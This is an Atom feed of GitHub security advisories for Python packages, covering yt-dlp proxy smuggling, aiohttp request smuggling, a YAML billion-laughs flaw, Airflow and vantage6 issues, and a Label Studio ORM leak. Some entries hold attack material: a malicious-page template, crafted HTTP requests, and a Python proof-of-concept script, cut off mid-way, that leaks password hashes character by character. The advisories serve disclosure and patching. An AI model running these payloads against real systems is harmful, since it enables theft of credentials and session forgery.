<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2023-11-15T18:01:34.152Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[yt-dlp] yt-dlp Generic Extractor MITM Vulnerability via Arbitrary Proxy Injection]]></title>
        <id>https://github.com/advisories/GHSA-3ch3-jhc6-5r8x</id>
        <link href="https://github.com/advisories/GHSA-3ch3-jhc6-5r8x"/>
        <updated>2023-11-15T14:48:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Generic Extractor in yt-dlp is vulnerable to an attacker setting an arbitrary proxy for a request to an arbitrary url, allowing the attacker to MITM the request made from yt-dlp's HTTP session. This could lead to cookie exfiltration in some cases.</p>
<details>

<p>To pass extra control data between extractors (such as headers like <code>Referer</code>), yt-dlp employs a concept of "url smuggling". This works by adding this extra data as json to the url fragment ("smuggling") that is then passed on to an extractor. The receiving extractor then "unsmuggles" the data from the input url. This functionality is intended to be internal only.</p>
<p>Currently, the Generic extractor supports receiving an arbitrary dictionary of HTTP headers in a smuggled url, of which it extracts and adds them to the initial request it makes to such url. This is useful when a url sent to the Generic extractor needs a <code>Referer</code> header sent with it, for example.</p>
<p>Additionally, yt-dlp has internal headers to set a proxy for a request: <code>Ytdl-request-proxy</code> and <code>Ytdl-socks-proxy</code>. While these are deprecated, internally <code>Ytdl-request-proxy</code> is still used for <code>--geo-verification-proxy</code>.</p>
<p>However, it is possible for a maliciously crafted site include these smuggled options in a url which then the Generic extractor extracts and redirects to itself.  This allows a malicious website to <strong>set an arbitrary proxy for an arbitrary url that the Generic extractor will request.</strong></p>
<p>This could allow for the following, but not limited too:</p>
<ul>
<li>An attacker can MITM a request it asks yt-dlp to make to <strong>any</strong> website.<ul>
<li>If a user has loaded cookies into yt-dlp for the target site, which are not marked as <a href="https://en.wikipedia.org/wiki/Secure_cookie">secure</a>, they could be exfiltrated by the attacker.</li>
<li>Fortunately most sites are HTTPS and should be setting cookies as secure.</li>
</ul>
</li>
<li>An attacker can set cookies for an arbitrary site.</li>
</ul>
<p>An example malicious webpage:</p>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;cinerama.embedPlayer('t','{{ target_site }}#__youtubedl_smuggle=%7B%22http_headers%22:%7B%22Ytdl-request-proxy%22:%22{{ proxy url }}%22%7D,%22fake%22:%22.smil/manifest%22%7D')
</code></pre>
<p>Where <code>{{ target_site }}</code> is the URL Generic extractor will request and <code>{{ proxy url }}</code> is the proxy to proxy the request for this url through.</p>
</details>

<h3 id="patches">Patches</h3>
<ul>
<li>We have removed the ability to smuggle <code>http_headers</code> to the Generic extractor, as well as other extractors that use the same pattern.</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Disable Generic extractor (<code>--ies default,-generic</code>), or only pass trusted sites with trusted content.</li>
<li>Take caution when using <code>--no-check-certificate</code>.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-3ch3-jhc6-5r8x">https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-3ch3-jhc6-5r8x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46121">https://nvd.nist.gov/vuln/detail/CVE-2023-46121</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp/releases/tag/2023.11.14">https://github.com/yt-dlp/yt-dlp/releases/tag/2023.11.14</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp/commit/f04b5bedad7b281bee9814686bba1762bae092eb">https://github.com/yt-dlp/yt-dlp/commit/f04b5bedad7b281bee9814686bba1762bae092eb</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-3ch3-jhc6-5r8x">https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-3ch3-jhc6-5r8x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46121">https://nvd.nist.gov/vuln/detail/CVE-2023-46121</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp/commit/f04b5bedad7b281bee9814686bba1762bae092eb">https://github.com/yt-dlp/yt-dlp/commit/f04b5bedad7b281bee9814686bba1762bae092eb</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp/releases/tag/2023.11.14">https://github.com/yt-dlp/yt-dlp/releases/tag/2023.11.14</a></li>
<li><a href="https://github.com/advisories/GHSA-3ch3-jhc6-5r8x">https://github.com/advisories/GHSA-3ch3-jhc6-5r8x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3ch3-jhc6-5r8x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-11-15T14:48:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vantage6-server] vantage6-server node accepts non-whitelisted algorithms from malicious server]]></title>
        <id>https://github.com/advisories/GHSA-vc3v-ppc7-v486</id>
        <link href="https://github.com/advisories/GHSA-vc3v-ppc7-v486"/>
        <updated>2023-11-14T22:21:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A node does not check if an image is allowed to run if a <code>parent_id</code> is set. A malicious party that breaches the server may modify it to set a fake <code>parent_id</code> and send a task of a non-whitelisted algorithm. The node will then execute it because the <code>parent_id</code> that is set prevents checks from being run. Relevant node code <a href="https://github.com/vantage6/vantage6/blob/version/4.1.1/vantage6-node/vantage6/node/docker/docker_manager.py#L265-L268">here</a></p>
<p>This impacts all servers that are breached by an expert user</p>
<h3 id="patches">Patches</h3>
<p>Fixed in v4.1.2</p>
<h3 id="workarounds">Workarounds</h3>
<p>None</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vantage6/vantage6/security/advisories/GHSA-vc3v-ppc7-v486">https://github.com/vantage6/vantage6/security/advisories/GHSA-vc3v-ppc7-v486</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47631">https://nvd.nist.gov/vuln/detail/CVE-2023-47631</a></li>
<li><a href="https://github.com/vantage6/vantage6/commit/bf83521eb12fa80aa5fc92ef1692010a9a7f8243">https://github.com/vantage6/vantage6/commit/bf83521eb12fa80aa5fc92ef1692010a9a7f8243</a></li>
<li><a href="https://github.com/vantage6/vantage6/blob/version/4.1.1/vantage6-node/vantage6/node/docker/docker_manager.py#L265-L268">https://github.com/vantage6/vantage6/blob/version/4.1.1/vantage6-node/vantage6/node/docker/docker_manager.py#L265-L268</a></li>
<li><a href="https://github.com/advisories/GHSA-vc3v-ppc7-v486">https://github.com/advisories/GHSA-vc3v-ppc7-v486</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vc3v-ppc7-v486</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-11-14T22:21:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aiohttp] AIOHTTP has problems in HTTP parser (the python one, not llhttp)]]></title>
        <id>https://github.com/advisories/GHSA-gfw2-4jvh-wgfg</id>
        <link href="https://github.com/advisories/GHSA-gfw2-4jvh-wgfg"/>
        <updated>2023-11-14T22:21:00.000Z</updated>
        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
<p>The HTTP parser in AIOHTTP has numerous problems with header parsing, which could lead to request smuggling.
This parser is only used when <code>AIOHTTP_NO_EXTENSIONS</code> is enabled (or not using a prebuilt wheel).</p>
<h1 id="details">Details</h1>
<h2 id="bug-1-bad-parsing-of-content-length-values">Bug 1: Bad parsing of <code>Content-Length</code> values</h2>
<h3 id="description">Description</h3>
<p>RFC 9110 says this:</p>
<blockquote>
<p><code>Content-Length = 1*DIGIT</code></p>
</blockquote>
<p>AIOHTTP does not enforce this rule, presumably because of an incorrect usage of the builtin <code>int</code> constructor. Because the <code>int</code> constructor accepts <code>+</code> and <code>-</code> prefixes, and digit-separating underscores, using <code>int</code> to parse CL values leads AIOHTTP to significant misinterpretation.</p>
<h3 id="examples">Examples</h3>
<pre><code>GET / HTTP/1.1\r\n
Content-Length: -0\r\n
\r\n
X
</code></pre>
<pre><code>GET / HTTP/1.1\r\n
Content-Length: +0_1\r\n
\r\n
X
</code></pre>
<h3 id="suggested-action">Suggested action</h3>
<p>Verify that a <code>Content-Length</code> value consists only of ASCII digits before parsing, as the standard requires.</p>
<h2 id="bug-2-improper-handling-of-nul-cr-and-lf-in-header-values">Bug 2: Improper handling of NUL, CR, and LF in header values</h2>
<h3 id="description-1">Description</h3>
<p>RFC 9110 says this:</p>
<blockquote>
<p>Field values containing CR, LF, or NUL characters are invalid and dangerous, due to the varying ways that implementations might parse and interpret those characters; a recipient of CR, LF, or NUL within a field value MUST either reject the message or replace each of those characters with SP before further processing or forwarding of that message.</p>
</blockquote>
<p>AIOHTTP's HTTP parser does not enforce this rule, and will happily process header values containing these three forbidden characters without replacing them with SP.</p>
<h3 id="examples-1">Examples</h3>
<pre><code>GET / HTTP/1.1\r\n
Header: v\x00alue\r\n
\r\n
</code></pre>
<pre><code>GET / HTTP/1.1\r\n
Header: v\ralue\r\n
\r\n
</code></pre>
<pre><code>GET / HTTP/1.1\r\n
Header: v\nalue\r\n
\r\n
</code></pre>
<h3 id="suggested-action-1">Suggested action</h3>
<p>Reject all messages with NUL, CR, or LF in a header value. The translation to space thing, while technically allowed, does not seem like a good idea to me.</p>
<h2 id="bug-3-improper-stripping-of-whitespace-before-colon-in-http-headers">Bug 3: Improper stripping of whitespace before colon in HTTP headers</h2>
<h3 id="description-2">Description</h3>
<p>RFC 9112 says this:</p>
<blockquote>
<p>No whitespace is allowed between the field name and colon. In the past, differences in the handling of such whitespace have led to security vulnerabilities in request routing and response handling. A server MUST reject, with a response status code of 400 (Bad Request), any received request message that contains whitespace between a header field name and colon.</p>
</blockquote>
<p>AIOHTTP does not enforce this rule, and will simply strip any whitespace before the colon in an HTTP header.</p>
<h3 id="example">Example</h3>
<pre><code>GET / HTTP/1.1\r\n
Content-Length : 1\r\n
\r\n
X
</code></pre>
<h3 id="suggested-action-2">Suggested action</h3>
<p>Reject all messages with whitespace before a colon in a header field, as the standard requires.</p>
<h1 id="poc">PoC</h1>
<p>Example requests are embedded in the previous section. To reproduce these bugs, start an AIOHTTP server without llhttp (i.e. <code>AIOHTTP_NO_EXTENSIONS=1</code>) and send the requests given in the previous section. (e.g. by <code>printf</code>ing into <code>nc</code>)</p>
<h1 id="impact">Impact</h1>
<p>Each of these bugs can be used for request smuggling.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/aio-libs/aiohttp/security/advisories/GHSA-gfw2-4jvh-wgfg">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-gfw2-4jvh-wgfg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47627">https://nvd.nist.gov/vuln/detail/CVE-2023-47627</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/commit/d5c12ba890557a575c313bb3017910d7616fce3d">https://github.com/aio-libs/aiohttp/commit/d5c12ba890557a575c313bb3017910d7616fce3d</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/releases/tag/v3.8.6">https://github.com/aio-libs/aiohttp/releases/tag/v3.8.6</a></li>
<li><a href="https://github.com/advisories/GHSA-gfw2-4jvh-wgfg">https://github.com/advisories/GHSA-gfw2-4jvh-wgfg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gfw2-4jvh-wgfg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-11-14T22:20:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[remarshal] Remarshal expands YAML alias nodes unlimitedly, hence Remarshal is vulnerable to Billion Laughs Attack]]></title>
        <id>https://github.com/advisories/GHSA-gw7g-qr8w-3448</id>
        <link href="https://github.com/advisories/GHSA-gw7g-qr8w-3448"/>
        <updated>2023-11-14T22:19:06.000Z</updated>
        <content type="html"><![CDATA[<p>Remarshal prior to v0.17.1 expands YAML alias nodes unlimitedly, hence Remarshal is vulnerable to Billion Laughs Attack. Processing untrusted YAML files may cause a denial-of-service (DoS) condition.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47163">https://nvd.nist.gov/vuln/detail/CVE-2023-47163</a></li>
<li><a href="https://github.com/remarshal-project/remarshal/commit/fd6ac799a02f533c3fc243b49cdd6d21aa7ee494">https://github.com/remarshal-project/remarshal/commit/fd6ac799a02f533c3fc243b49cdd6d21aa7ee494</a></li>
<li><a href="https://github.com/remarshal-project/remarshal/releases/tag/v0.17.1">https://github.com/remarshal-project/remarshal/releases/tag/v0.17.1</a></li>
<li><a href="https://jvn.jp/en/jp/JVN86156389/">https://jvn.jp/en/jp/JVN86156389/</a></li>
<li><a href="https://github.com/advisories/GHSA-gw7g-qr8w-3448">https://github.com/advisories/GHSA-gw7g-qr8w-3448</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gw7g-qr8w-3448</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-11-13T03:30:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aiohttp] Aiohttp has inconsistent interpretation of `Content-Length` vs. `Transfer-Encoding` differing in C and Python fallbacks]]></title>
        <id>https://github.com/advisories/GHSA-xx9p-xxvh-7g8j</id>
        <link href="https://github.com/advisories/GHSA-xx9p-xxvh-7g8j"/>
        <updated>2023-11-14T21:37:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Aiohttp has a security vulnerability regarding the inconsistent interpretation of the http protocol. As we know that HTTP/1.1 is persistent, if we have both Content-Length(CL) and Transfer-Encoding(TE) it can lead to incorrect interpretation of two entities that parse the HTTP and we can poison other sockets with this incorrect interpretation.</p>
<p>A possible Proof-of-Concept (POC) would be a configuration with a reverse proxy(frontend) that accepts both CL and TE headers and aiohttp as backend. As aiohttp parses anything with chunked, we can pass a chunked123 as TE, the frontend entity will ignore this header and will parse Content-Length. I can give a Dockerfile with the configuration if you want.</p>
<p>The impact of this vulnerability is that it is possible to bypass any proxy rule, poisoning sockets to other users like passing Authentication Headers, also if it is present an Open Redirect (just like CVE-2021-21330) we can combine it to redirect random users to our website and log the request.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/aio-libs/aiohttp/commit/f016f0680e4ace6742b03a70cb0382ce86abe371">https://github.com/aio-libs/aiohttp/commit/f016f0680e4ace6742b03a70cb0382ce86abe371</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/aio-libs/aiohttp/security/advisories/GHSA-xx9p-xxvh-7g8j">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-xx9p-xxvh-7g8j</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/commit/f016f0680e4ace6742b03a70cb0382ce86abe371">https://github.com/aio-libs/aiohttp/commit/f016f0680e4ace6742b03a70cb0382ce86abe371</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/releases/tag/v3.8.0">https://github.com/aio-libs/aiohttp/releases/tag/v3.8.0</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47641">https://nvd.nist.gov/vuln/detail/CVE-2023-47641</a></li>
<li><a href="https://github.com/advisories/GHSA-xx9p-xxvh-7g8j">https://github.com/advisories/GHSA-xx9p-xxvh-7g8j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xx9p-xxvh-7g8j</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-11-14T20:36:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Apache Airflow vulnerable to Exposure of Sensitive Information to an Unauthorized Actor]]></title>
        <id>https://github.com/advisories/GHSA-r7x6-xfcm-3mxv</id>
        <link href="https://github.com/advisories/GHSA-r7x6-xfcm-3mxv"/>
        <updated>2023-11-14T20:35:48.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Airflow, versions before 2.7.3, has a vulnerability that allows an authorized user who has access to read specific DAGs only, to read information about task instances in other DAGs.&nbsp; This is a different issue than CVE-2023-42663 but leading to similar outcome.
Users of Apache Airflow are advised to upgrade to version 2.7.3 or newer to mitigate the risk associated with this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-42781">https://nvd.nist.gov/vuln/detail/CVE-2023-42781</a></li>
<li><a href="https://github.com/apache/airflow/pull/34939">https://github.com/apache/airflow/pull/34939</a></li>
<li><a href="https://lists.apache.org/thread/7dnl8nszdxqyns57f3dw0sloy5dfl9o1">https://lists.apache.org/thread/7dnl8nszdxqyns57f3dw0sloy5dfl9o1</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/11/12/2">http://www.openwall.com/lists/oss-security/2023/11/12/2</a></li>
<li><a href="https://github.com/apache/airflow/commit/33ec72948f74f56f2adb5e2d388e60e88e8a3fa3">https://github.com/apache/airflow/commit/33ec72948f74f56f2adb5e2d388e60e88e8a3fa3</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2023-231.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2023-231.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-r7x6-xfcm-3mxv">https://github.com/advisories/GHSA-r7x6-xfcm-3mxv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r7x6-xfcm-3mxv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-11-12T15:30:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[label-studio] Label Studio Object Relational Mapper Leak Vulnerability in Filtering Task]]></title>
        <id>https://github.com/advisories/GHSA-6hjj-gq77-j4qw</id>
        <link href="https://github.com/advisories/GHSA-6hjj-gq77-j4qw"/>
        <updated>2023-11-14T18:27:12.000Z</updated>
        <content type="html"><![CDATA[<h1 id="introduction">Introduction</h1>
<p>This write-up describes a vulnerability found in <a href="https://github.com/HumanSignal/label-studio">Label Studio</a>, a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to <code>1.9.2post0</code> and was tested on version <code>1.8.2</code>.</p>
<h1 id="overview">Overview</h1>
<p>In all current versions of <a href="https://github.com/HumanSignal/label-studio">Label Studio</a>, the application allows users to insecurely set filters for filtering tasks. An attacker can construct a <em>filter chain</em> to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.</p>
<pre><code>filter:tasks:updated_by__active_organization__active_users__password
</code></pre>
<p>For consistency, this type of vulnerability will be termed as <strong>ORM Leak</strong> in the rest of this disclosure. </p>
<p>In addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.</p>
<h1 id="description">Description</h1>
<p>The following code snippet from the <code>ViewSetSerializer</code> in <a href="https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115"><code>label_studio/data_manager/serializers.py</code></a> insecurely creates <code>Filter</code> objects from a JSON <code>POST</code> request to the <code>/api/dm/views/{viewId}</code> API endpoint.</p>
<pre><code class="language-python">    @staticmethod
    def _create_filters(filter_group, filters_data):
        filter_index = 0
        for filter_data in filters_data:
            filter_data["index"] = filter_index
            filter_group.filters.add(Filter.objects.create(**filter_data))
            filter_index += 1
</code></pre>
<p>These <code>Filter</code> objects are then applied in the <code>TaskQuerySet</code> in <a href="https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473"><code>label_studio/data_manager/managers.py</code></a>.</p>
<pre><code class="language-python">class TaskQuerySet(models.QuerySet):
    def prepared(self, prepare_params=None):
        """ Apply filters, ordering and selected items to queryset

        :param prepare_params: prepare params with project, filters, orderings, etc
        :return: ordered and filtered queryset
        """
        from projects.models import Project

        queryset = self

        if prepare_params is None:
            return queryset

        project = Project.objects.get(pk=prepare_params.project)
        request = prepare_params.request
        queryset = apply_filters(queryset, prepare_params.filters, project, request) &lt;1&gt;
        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)

        if not prepare_params.selectedItems:
            return queryset

        # included selected items
        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:
            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)

        # excluded selected items
        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:
            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)

        return queryset
</code></pre>
<ol>
<li>User provided filters are insecurely applied here by calling the <code>apply_filters</code> that constructs the Django ORM filter.</li>
</ol>
<p>The <code>PreparedTaskManager</code> in <a href="https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655"><code>label_studio/data_manager/managers.py</code></a> uses the vulnerable <code>TaskQuerySet</code> for building the Django queryset for querying <code>Task</code> objects, as shown in the following code snippet.</p>
<pre><code class="language-python">class PreparedTaskManager(models.Manager):
    #...

    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): &lt;1&gt;
        """
        :param fields_for_evaluation: list of annotated fields in task
        :param prepare_params: filters, ordering, selected items
        :param all_fields: evaluate all fields for task
        :param request: request for user extraction
        :return: task queryset with annotated fields
        """
        queryset = self.only_filtered(prepare_params=prepare_params)
        return self.annotate_queryset(
            queryset,
            fields_for_evaluation=fields_for_evaluation,
            all_fields=all_fields,
            request=prepare_params.request
        )

    def only_filtered(self, prepare_params=None):
        request = prepare_params.request
        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) &lt;1&gt;
        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)
        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)
        return queryset.prepared(prepare_params=prepare_params)
</code></pre>
<ol>
<li>Special Django method for the <code>models.Manager</code> class that is used to retrieve the queryset for querying objects of a model.</li>
<li>Uses the vulnerable <code>TaskQuerySet</code> that was explained above.</li>
</ol>
<p>The following code snippet of the <code>Task</code> model in <a href="https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102"><code>label_studio/tasks/models.py</code></a> shows that the vulnerable <code>PreparedTaskManager</code> is set as a class variable, along with the <code>updated_by</code> relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.</p>
<pre><code class="language-python"># ...
class Task(TaskMixin, models.Model):
    """ Business tasks from project
    """
    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)

    # ...

    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',
        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),
        help_text='Last annotator or reviewer who updated this task') &lt;1&gt;

    # ...

    objects = TaskManager()  # task manager by default
    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app &lt;2&gt;

    # ...
</code></pre>
<ol>
<li>The entry point of the filter chain to filter by the <code>updated_by__active_organization__active_users__password</code>.</li>
<li>The vulnerable <code>PreparedTaskManager</code> being set that will be exploited.</li>
</ol>
<p>Finally, the <code>TaskListAPI</code> view set in <a href="https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205"><code>label_studio/tasks/api.py</code></a> with the <code>/api/tasks</code> API endpoint uses the vulnerable <code>PreparedTaskManager</code> to filter <code>Task</code> objects.</p>
<pre><code class="language-python">    def get_queryset(self):
        task_id = self.request.parser_context['kwargs'].get('pk')
        task = generics.get_object_or_404(Task, pk=task_id)
        review = bool_from_request(self.request.GET, 'review', False)
        selected = {"all": False, "included": [self.kwargs.get("pk")]}
        if review:
            kwargs = {
                'fields_for_evaluation': ['annotators', 'reviewed']
            }
        else:
            kwargs = {'all_fields': True}
        project = self.request.query_params.get('project') or self.request.data.get('project')
        if not project:
            project = task.project.id
        return self.prefetch(
            Task.prepared.get_queryset(
                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),
                **kwargs
            )) &lt;1&gt;
</code></pre>
<ol>
<li>Uses the vulnerable <code>PreparedTaskManager</code> to filter objects.</li>
</ol>
<h1 id="proof-of-concept">Proof of Concept</h1>
<p>Below are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.</p>
<ol>
<li>Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.</li>
<li>Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.</li>
<li>Navigate to the task view for the project and add any filter with the <code>Network</code> inspect tab open on the browser. Look for a <code>PATCH</code> request to <code>/api/dm/views/{view_id}?interaction=filter&amp;project={project_id}</code> and save the <code>view_id</code> and <code>project_id</code> for the next step.</li>
<li>Download the attached proof of concept exploit script named <code>labelstudio_ormleak.py</code>. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the <code>{view_id}</code>, <code>{project_id}</code>, <code>{cookie_str}</code> and <code>{url}</code> with the corresponding values. For further explanation run <code>python3 labelstudio_ormleak.py --help</code>.</li>
</ol>
<pre><code class="language-bash">python3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'
</code></pre>
<p>The following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash <code>pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=</code>.</p>
<p><img alt="labelstudio_ormleak_poc" src="https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif"></p>
<h1 id="impact">Impact</h1>
<p>This vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions <code>&lt;=1.8.1</code>, this finding can also be chained with hard coded <code>SECRET_KEY</code> to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.</p>
<h1 id="remediation-advice">Remediation Advice</h1>
<ul>
<li>Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.</li>
<li>Validate filter values to an allow list before performing any queries.</li>
</ul>
<h1 id="discovered">Discovered</h1>
<ul>
<li>August 2023, Alex Brown, elttam</li>
</ul>
<hr>
<h1 id="labelstudio_ormleakpy-proof-of-concept"><code>labelstudio_ormleak.py</code> proof of concept</h1>
<pre><code class="language-py">import argparse
import re
import requests
import string
import sys

# Password hash characters
CHARS = string.ascii_letters + string.digits + '$/+=_!'
CHARS_LEN = len(CHARS)

PAYLOAD = {
    "data": {
        "columnsDisplayType": {},
        "columnsWidth": {},
        "filters": {
            "conjunction": "and",
            "items": [
                {
                    "filter": "filter:tasks:updated_by__active_organization__active_users__password", # ORM Leak filter chain
                    "operator": "regex", # Use regex operator to filter password hash value
                    "type": "String",
                    "value": "REPLACEME"
                }
            ]
        },
        "gridWidth": 4,
        "hiddenColumns":{"explore":["tasks:inner_id"],"labeling":["tasks:id","tasks:inner_id"]},
        "ordering": [],
        "search_text": None,
        "target": "tasks",
        "title": "Default",
        "type": "list"
    },
    "id": 1, # View ID
    "project": "1" # Project ID
}

def parse_args() -&gt; argparse.Namespace:
    parser = argparse.ArgumentParser(
        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'
    )

    parser.add_argument(
        '-v', '--view-id',
        help='View id of the page',
        type=int,
        required=True
    )

    parser.add_argument(
        '-p', '--project-id',
        help='Project id to filter tasks for',
        type=int,
        required=True
    )

    parser.add_argument(
        '-c', '--cookie-str',
        help='Cookie string for authentication',
        required=True
    )

    parser.add_argument(
        '-u', '--url',
        help='Base URL to Label Studio instance',
        required=True
    )

    return parser.parse_args()

def setup() -&gt; dict:
    args = parse_args()
    view_id = args.view_id
    project_id = args.project_id
    path_1 = "/api/dm/views/{view_id}?interaction=filter&amp;project={project_id}".format(
        view_id=view_id,
        project_id=project_id
    )
    path_2 = "/api/tasks?page=1&amp;page_size=1&amp;view={view_id}&amp;interaction=filter&amp;project={project_id}".format(
        view_id=view_id,
        project_id=project_id
    )
    PAYLOAD["id"] = view_id
    PAYLOAD["project"] = str(project_id)
    
    config_dict = {
        'COOKIE_STR': args.cookie_str,
        'URL_PATH_1': args.url + path_1,
        'URL_PATH_2': args.url + path_2,
        'PAYLOAD': PAYLOAD
    }
    return config_dict

def test_payload(config_dict: dict, payload) -&gt; bool:
    sys.stdout.flush()
    cookie_str = config_dict["COOKIE_STR"]
    r_set = requests.patch(
        config_dict["URL_PATH_1"],
        json=payload,
        headers={
            "Cookie": cookie_str
        }
    )

    r_listen = requests.get(
        config_dict['URL_PATH_2'],
        headers={
            "Cookie": cookie_str
        }
    )

    r_json = r_listen.json()
    return len(r_json["tasks"]) &gt;= 1

